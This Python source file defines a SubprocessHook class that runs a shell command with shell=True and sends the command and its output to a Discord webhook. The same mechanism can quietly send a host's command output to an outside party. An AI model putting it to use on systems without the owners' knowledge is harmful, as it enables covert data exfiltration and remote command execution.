import subprocess
from discord_webhook import DiscordWebhook, DiscordEmbed
from discord_winhook.base import Hook

class SubprocessHook(Hook):
    def __init__(self, url: str, command: str):
        super().__init__(url)
        self.__command = command

    def run_subprocess(self):
        try:
            # Run the subprocess and capture the output
            result = subprocess.run(self.__command, capture_output=True, text=True, shell=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return f"Error: {e}"

    def run(self):
        output = self.run_subprocess()

        webhook = DiscordWebhook(url=self.url)

        embed = DiscordEmbed(title="Subprocess Output", color="03b2f8")
        embed.add_embed_field(name="Command", value=self.__command, inline=False)
        embed.add_embed_field(name="Output", value=f"```\n{output}\n```", inline=False)

        webhook.add_embed(embed)
        self._Hook__send(webhook)

    @property
    def info(self):
        return f"<SubprocessHook command='{self.__command}'>"
